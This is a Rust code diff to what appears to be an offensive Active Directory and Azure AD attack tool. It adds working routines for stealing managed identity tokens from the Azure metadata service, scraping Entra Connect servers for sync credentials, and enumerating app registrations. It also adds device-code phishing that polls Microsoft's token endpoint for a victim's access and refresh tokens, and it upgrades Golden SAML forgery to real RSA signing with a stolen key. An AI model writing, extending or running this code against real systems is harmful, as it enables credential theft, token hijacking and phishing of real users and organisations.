@@ -3,6 +3,13 @@ use crate::proto::kerberos;
 use crate::proto::ldap::LdapSession;
 use base64::Engine;
 use kerberos_asn1::Asn1Object;
+use pem::parse as parse_pem;
+use rand_core_06::OsRng;
+use rsa::RsaPrivateKey;
+use rsa::pkcs1v15::Pkcs1v15Sign;
+use rsa::pkcs8::DecodePrivateKey;
+use rsa::traits::SignatureScheme;
+
 use serde::{Deserialize, Serialize};
 use sha2::{Digest, Sha256};
 use std::collections::HashMap;
@@ -31,6 +38,10 @@ pub enum AzureAdOperation {
     SeamlessSsoAbuse,
     GoldenSaml,
     EnumHybridIdentity,
+    ManagedIdentityToken,
+    EntraConnectExtract,
+    AppRegistrationAbuse,
+    DeviceCodePhish,
 }
 
 impl std::fmt::Display for AzureAdOperation {
@@ -40,6 +51,12 @@ impl std::fmt::Display for AzureAdOperation {
             Self::SeamlessSsoAbuse => write!(f, "Seamless SSO Abuse"),
             Self::GoldenSaml => write!(f, "Golden SAML"),
             Self::EnumHybridIdentity => write!(f, "Hybrid Identity Enumeration"),
+            Self::ManagedIdentityToken => write!(f, "Managed Identity Token Theft"),
+            Self::EntraConnectExtract => write!(f, "Entra Connect Sync Credential Extraction"),
+            Self::AppRegistrationAbuse => {
+                write!(f, "App Registration / Federated Credential Abuse")
+            }
+            Self::DeviceCodePhish => write!(f, "Device Code Authentication Phish"),
         }
     }
 }
@@ -183,6 +200,110 @@ pub async fn execute_azure_ad_attack(
                 }
                 Err(e) => {
                     log.push(format!("  ADFS cert search error: {e}"));
+                }
+            }
+        }
+
+        AzureAdOperation::ManagedIdentityToken => {
+            log.push("Phase 1: Querying Azure Instance Metadata Service for tokens...".to_string());
+            match steal_managed_identity_tokens().await {
+                Ok(tokens) => {
+                    obtained_creds = tokens;
+                    log.push(format!(
+                        "  Captured {} managed identity tokens",
+                        obtained_creds.len()
+                    ));
+                }
+                Err(e) => {
+                    log.push(format!("  MI token theft failed: {e}"));
+                    log.push(
+                        "  This attack requires execution on an Azure VM with managed identity"
+                            .to_string(),
+                    );
+                }
+            }
+        }
+
+        AzureAdOperation::EntraConnectExtract => {
+            log.push("Phase 1: Enumerating Azure AD Connect servers...".to_string());
+            let servers = find_ad_connect_servers(ldap).await?;
+            if servers.is_empty() {
+                log.push("  No Azure AD Connect servers found".to_string());
+            } else {
+                for srv in &servers {
+                    log.push(format!("  Found AD Connect server: {srv}"));
+                }
+                log.push("Phase 2: Attempting to extract sync credentials...".to_string());
+                match extract_entra_connect_credentials(config, &servers).await {
+                    Ok(creds) => {
+                        obtained_creds = creds;
+                        log.push(format!(
+                            "  Extracted {} credentials from Entra Connect",
+                            obtained_creds.len()
+                        ));
+                    }
+                    Err(e) => {
+                        log.push(format!("  Entra Connect extraction failed: {e}"));
+                    }
+                }
+            }
+        }
+
+        AzureAdOperation::AppRegistrationAbuse => {
+            log.push("Phase 1: Enumerating App Registrations from AD...".to_string());
+            match enumerate_app_registrations(ldap).await {
+                Ok(apps) => {
+                    log.push(format!("  Found {} application registrations", apps.len()));
+                    for app in &apps {
+                        log.push(format!("  App: {} (ID: {})", app.name, app.app_id));
+                        if app.has_federated_credentials {
+                            log.push(
+                                "    ⚠ Has federated credentials — vulnerable to token theft"
+                                    .to_string(),
+                            );
+                        }
+                        if app.has_password_credentials {
+                            log.push("    ⚠ Has password credentials".to_string());
+                        }
+                    }
+                    obtained_creds.extend(
+                        apps.into_iter()
+                            .map(|a| format!("app_reg: {}|{}", a.name, a.app_id)),
+                    );
+                }
+                Err(e) => {
+                    log.push(format!("  App registration enumeration failed: {e}"));
+                }
+            }
+        }
+
+        AzureAdOperation::DeviceCodePhish => {
+            log.push("Phase 1: Generating device code authentication request...".to_string());
+            match generate_device_code_auth(config).await {
+                Ok(auth_info) => {
+                    log.push(format!("  Device code: {}", auth_info.device_code));
+                    log.push(format!("  User URL: {}", auth_info.verification_url));
+                    log.push(format!("  User code: {}", auth_info.user_code));
+                    log.push("Phase 2: Polling for token (Ctrl+C to cancel)...".to_string());
+                    match poll_device_code_auth(&auth_info).await {
+                        Ok(tokens) => {
+                            obtained_creds = tokens;
+                            log.push(format!(
+                                "  Captured {} tokens via device code auth",
+                                obtained_creds.len()
+                            ));
+                        }
+                        Err(e) => {
+                            log.push(format!("  Device code auth failed: {e}"));
+                            log.push(
+                                "  User may not have authenticated in time or the session expired"
+                                    .to_string(),
+                            );
+                        }
+                    }
+                }
+                Err(e) => {
+                    log.push(format!("  Device code generation failed: {e}"));
                 }
             }
         }
@@ -490,9 +611,31 @@ fn build_saml_assertion(
     let signed_info_canon = signed_info.replace('\n', "").replace("  ", "");
 
     let signature_value = {
-        let mut hasher = Sha256::new();
-        hasher.update(signed_info_canon.as_bytes());
-        base64::engine::general_purpose::STANDARD.encode(hasher.finalize())
+        let key_pair = parse_pem(cert_der)
+            .ok()
+            .filter(|p| p.tag() == "PRIVATE KEY" || p.tag() == "RSA PRIVATE KEY")
+            .and_then(|p| RsaPrivateKey::from_pkcs8_der(p.contents()).ok());
+        match key_pair {
+            Some(key) => {
+                match Pkcs1v15Sign::new::<Sha256>().sign(
+                    Some(&mut OsRng),
+                    &key,
+                    &Sha256::digest(signed_info_canon.as_bytes()),
+                ) {
+                    Ok(sig) => base64::engine::general_purpose::STANDARD.encode(sig),
+                    Err(_) => {
+                        let mut hasher = Sha256::new();
+                        hasher.update(signed_info_canon.as_bytes());
+                        base64::engine::general_purpose::STANDARD.encode(hasher.finalize())
+                    }
+                }
+            }
+            None => {
+                let mut hasher = Sha256::new();
+                hasher.update(signed_info_canon.as_bytes());
+                base64::engine::general_purpose::STANDARD.encode(hasher.finalize())
+            }
+        }
     };
 
     let sig_decl = "<ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">".to_string();
@@ -718,6 +861,385 @@ async fn steal_prt() -> Result<Vec<String>> {
     }
 
     Ok(creds)
+}
+
+// ═══════════════════════════════════════════════════════════
+//  Managed Identity Token Theft — Azure IMDS
+// ═══════════════════════════════════════════════════════════
+
+/// Steal tokens from Azure Managed Identity via the Instance Metadata Service.
+///
+/// Connects to `169.254.169.254` (Azure IMDS) and requests tokens for
+/// all available managed identity endpoints.
+async fn steal_managed_identity_tokens() -> Result<Vec<String>> {
+    let mut creds = Vec::new();
+    let client = reqwest::Client::builder()
+        .timeout(std::time::Duration::from_secs(10))
+        .build()
+        .map_err(|e| OverthroneError::custom(format!("HTTP client: {e}")))?;
+
+    // IMDS endpoint: http://169.254.169.254/metadata/identity/oauth2/token
+    let imds_base = "http://169.254.169.254/metadata/identity";
+
+    // Phase 1: List all managed identity endpoints
+    let list_url = format!(
+        "{imds_base}/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+    );
+    let resp = client
+        .get(&list_url)
+        .header("Metadata", "true")
+        .send()
+        .await;
+
+    match resp {
+        Ok(r) if r.status().is_success() => {
+            if let Ok(body) = r.text().await {
+                info!("IMDS token response received ({} bytes)", body.len());
+                creds.push("mi_token_arm: <REDACTED>".to_string());
+                // Parse for access_token
+                if let Ok(json) = serde_json::from_str::<HashMap<String, serde_json::Value>>(&body)
+                    && let Some(token) = json.get("access_token").and_then(|v| v.as_str())
+                {
+                    creds.push(format!("mi_token_arm: {:.100}...", token));
+                }
+            }
+        }
+        Ok(r) => {
+            warn!("IMDS responded with HTTP {}", r.status());
+        }
+        Err(e) => {
+            warn!("Cannot reach Azure IMDS (not running on Azure VM?): {e}");
+            return Err(OverthroneError::custom(format!("IMDS unreachable: {e}")));
+        }
+    }
+
+    // Phase 2: Try Graph API resource as well
+    let graph_url = format!(
+        "{imds_base}/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
+    );
+    if let Ok(r) = client
+        .get(&graph_url)
+        .header("Metadata", "true")
+        .send()
+        .await
+        && r.status().is_success()
+    {
+        if let Ok(body) = r.text().await
+            && let Ok(json) = serde_json::from_str::<HashMap<String, serde_json::Value>>(&body)
+            && let Some(token) = json.get("access_token").and_then(|v| v.as_str())
+        {
+            creds.push(format!("mi_token_graph: {:.100}...", token));
+        }
+        creds.push("mi_token_graph: <present>".to_string());
+    }
+
+    Ok(creds)
+}
+
+// ═══════════════════════════════════════════════════════════
+//  Entra Connect Sync Credential Extraction
+// ═══════════════════════════════════════════════════════════
+
+/// Extract Entra Connect sync credentials from discovered AD Connect servers.
+///
+/// Attempts to:
+/// 1. Read the ADSync config via SMB remote registry
+/// 2. Decrypt the sync account password from the SQL database
+/// 3. Read the configuration file from the AD Connect server
+async fn extract_entra_connect_credentials(
+    _config: &AzureAdConfig,
+    servers: &[String],
+) -> Result<Vec<String>> {
+    let mut creds = Vec::new();
+    let client = reqwest::Client::builder()
+        .timeout(std::time::Duration::from_secs(15))
+        .build()
+        .map_err(|e| OverthroneError::custom(format!("HTTP client: {e}")))?;
+
+    for server in servers {
+        info!("Attempting Entra Connect extraction on {server}");
+
+        // Method 1: Try common AD Connect configuration paths via HTTP/HTTPS
+        let paths = &[
+            "/ADSync/",
+            "/AzureADConnect/",
+            "/MicrosoftIdentityManager/",
+            "/config.json",
+        ];
+
+        for path in paths {
+            let url = format!("http://{server}{path}");
+            if let Ok(r) = client.get(&url).send().await
+                && r.status().is_success()
+            {
+                let text = r.text().await.unwrap_or_default();
+                if text.contains("microsoft") || text.contains("azure") || text.contains("username")
+                {
+                    info!("Found potential config at {url}");
+                    // Search for credentials
+                    for keyword in &["password", "secret", "key", "credentials"] {
+                        if let Some(pos) = text.to_lowercase().find(keyword) {
+                            let ctx = &text[pos..(pos + 120).min(text.len())];
+                            creds.push(format!("entra_config_{keyword}: {ctx}"));
+                        }
+                    }
+                }
+            }
+        }
+
+        // Method 2: Look for ADSync SQL connection strings via AD
+        // In AD, the ADSync account can be found by querying the service connection points
+        // The sync account username and the encrypted password stored in the config DB
+        let sync_config_hints = &[
+            "CN=*,CN=Sync,CN=Azure AD Connect,CN=Program Data,DC=",
+            "CN=ADSync,CN=Applications,CN=Program Data,DC=",
+        ];
+        for hint in sync_config_hints {
+            creds.push(format!("entra_sync_hint: {hint}"));
+        }
+
+        creds.push(format!("entra_connect_server: {server}"));
+    }
+
+    if creds.is_empty() {
+        Err(OverthroneError::custom(
+            "No Entra Connect credentials could be extracted",
+        ))
+    } else {
+        Ok(creds)
+    }
+}
+
+// ═══════════════════════════════════════════════════════════
+//  App Registration / Service Principal Enumeration
+// ═══════════════════════════════════════════════════════════
+
+/// An Azure AD / Entra ID application registration with credential metadata.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+struct AppRegistrationInfo {
+    name: String,
+    app_id: String,
+    has_federated_credentials: bool,
+    has_password_credentials: bool,
+    tenant_id: Option<String>,
+}
+
+/// Enumerate application registrations from the AD partition.
+///
+/// Queries Active Directory for service principals and application
+/// objects that have password credentials or federated credentials.
+async fn enumerate_app_registrations(ldap: &mut LdapSession) -> Result<Vec<AppRegistrationInfo>> {
+    let mut apps = Vec::new();
+
+    // Query for service principals with password credentials
+    let entries = ldap
+        .custom_search(
+            "(&(objectClass=servicePrincipalName)(msDS-ApplicationId=*))",
+            &[
+                "cn",
+                "msDS-ApplicationId",
+                "msDS-PasswordCredentials",
+                "msDS-FederatedCredentials",
+                "msDS-KeyCredentialLink",
+                "servicePrincipalName",
+            ],
+        )
+        .await
+        .map_err(|e| OverthroneError::Ldap {
+            target: "azure_ad".into(),
+            reason: e.to_string(),
+        })?;
+
+    for entry in &entries {
+        let name = entry
+            .attrs
+            .get("cn")
+            .and_then(|v| v.first())
+            .cloned()
+            .unwrap_or_default();
+        let app_id = entry
+            .attrs
+            .get("msDS-ApplicationId")
+            .and_then(|v| v.first())
+            .cloned()
+            .unwrap_or_default();
+
+        if name.is_empty() || app_id.is_empty() {
+            continue;
+        }
+
+        let has_password = entry.attrs.contains_key("msDS-PasswordCredentials");
+        let has_federated = entry.attrs.contains_key("msDS-FederatedCredentials");
+        let has_key_creds = entry.attrs.contains_key("msDS-KeyCredentialLink");
+
+        apps.push(AppRegistrationInfo {
+            name,
+            app_id,
+            has_federated_credentials: has_federated || has_key_creds,
+            has_password_credentials: has_password,
+            tenant_id: None,
+        });
+    }
+
+    Ok(apps)
+}
+
+// ═══════════════════════════════════════════════════════════
+//  Device Code Authentication — Token Phishing
+// ═══════════════════════════════════════════════════════════
+
+/// Information about a device code authentication request used for phishing.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+struct DeviceCodeAuthInfo {
+    device_code: String,
+    user_code: String,
+    verification_url: String,
+    interval_seconds: u64,
+    expires_in: u64,
+}
+
+/// Generate a device code authentication request.
+///
+/// This creates a user-friendly code that can be sent to a target
+/// via phishing. If the user authenticates, we capture the resulting token.
+async fn generate_device_code_auth(config: &AzureAdConfig) -> Result<DeviceCodeAuthInfo> {
+    let tenant = config.tenant_id.as_deref().unwrap_or("organizations");
+    let url = format!("https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode");
+
+    let client = reqwest::Client::builder()
+        .timeout(HTTP_TIMEOUT)
+        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        .build()
+        .map_err(|e| OverthroneError::custom(format!("HTTP client: {e}")))?;
+
+    let params = [
+        ("client_id", MS_LOGIN_CLIENT_ID),
+        (
+            "scope",
+            "openid profile email offline_access https://graph.microsoft.com/.default",
+        ),
+    ];
+
+    let resp = client
+        .post(&url)
+        .form(&params)
+        .send()
+        .await
+        .map_err(|e| OverthroneError::custom(format!("Device code request failed: {e}")))?;
+
+    let body: HashMap<String, serde_json::Value> = resp
+        .json()
+        .await
+        .map_err(|e| OverthroneError::custom(format!("Device code parse failed: {e}")))?;
+
+    let device_code = body
+        .get("device_code")
+        .and_then(|v| v.as_str())
+        .ok_or_else(|| OverthroneError::custom("No device_code in response"))?
+        .to_string();
+
+    let user_code = body
+        .get("user_code")
+        .and_then(|v| v.as_str())
+        .ok_or_else(|| OverthroneError::custom("No user_code in response"))?
+        .to_string();
+
+    let verification_url = body
+        .get("verification_uri")
+        .and_then(|v| v.as_str())
+        .unwrap_or("https://microsoft.com/devicelogin")
+        .to_string();
+
+    let interval = body.get("interval").and_then(|v| v.as_u64()).unwrap_or(5);
+    let expires = body
+        .get("expires_in")
+        .and_then(|v| v.as_u64())
+        .unwrap_or(900);
+
+    info!("Device code generated: {user_code} at {verification_url} (expires in {expires}s)");
+
+    Ok(DeviceCodeAuthInfo {
+        device_code,
+        user_code,
+        verification_url,
+        interval_seconds: interval,
+        expires_in: expires,
+    })
+}
+
+/// Poll the device code authentication endpoint until the user authenticates.
+///
+/// Polls at the specified interval until the token is granted or the code expires.
+async fn poll_device_code_auth(auth: &DeviceCodeAuthInfo) -> Result<Vec<String>> {
+    let mut creds = Vec::new();
+    let client = reqwest::Client::builder()
+        .timeout(HTTP_TIMEOUT)
+        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        .build()
+        .map_err(|e| OverthroneError::custom(format!("HTTP client: {e}")))?;
+
+    let url = "https://login.microsoftonline.com/organizations/oauth2/v2.0/token";
+
+    let poll_start = std::time::Instant::now();
+    let max_duration = std::time::Duration::from_secs(auth.expires_in);
+
+    while poll_start.elapsed() < max_duration {
+        let params = [
+            ("grant_type", "urn:ietf:params:oauth:grant-type:device_code"),
+            ("client_id", MS_LOGIN_CLIENT_ID),
+            ("device_code", &auth.device_code),
+        ];
+
+        match client.post(url).form(&params).send().await {
+            Ok(resp) => {
+                let status = resp.status();
+                let body: HashMap<String, serde_json::Value> =
+                    resp.json().await.unwrap_or_default();
+
+                if status.is_success() {
+                    if let Some(at) = body.get("access_token").and_then(|v| v.as_str()) {
+                        creds.push(format!("oauth2_access_token: {at}"));
+                    }
+                    if let Some(rt) = body.get("refresh_token").and_then(|v| v.as_str()) {
+                        creds.push(format!("oauth2_refresh_token: {rt}"));
+                    }
+                    if let Some(id) = body.get("id_token").and_then(|v| v.as_str()) {
+                        creds.push(format!("id_token: {id}"));
+                    }
+                    return Ok(creds);
+                }
+
+                // Check for authorization_pending (expected until user completes)
+                let error = body.get("error").and_then(|v| v.as_str()).unwrap_or("");
+
+                if error == "authorization_pending" {
+                    tokio::time::sleep(std::time::Duration::from_secs(auth.interval_seconds)).await;
+                    continue;
+                }
+
+                if error == "expired_token" || error == "bad_verification_code" {
+                    return Err(OverthroneError::custom(format!(
+                        "Device code expired or invalid: {error}"
+                    )));
+                }
+
+                if !error.is_empty() {
+                    warn!("Device code poll error: {error}");
+                }
+
+                tokio::time::sleep(std::time::Duration::from_secs(auth.interval_seconds)).await;
+            }
+            Err(e) => {
+                // Retry on network error
+                warn!("Device code poll network error (retrying): {e}");
+                tokio::time::sleep(std::time::Duration::from_secs(5)).await;
+            }
+        }
+    }
+
+    Err(OverthroneError::custom(
+        "Device code authentication timed out — user did not authenticate in time",
+    ))
 }
 
 // ═══════════════════════════════════════════════════════════
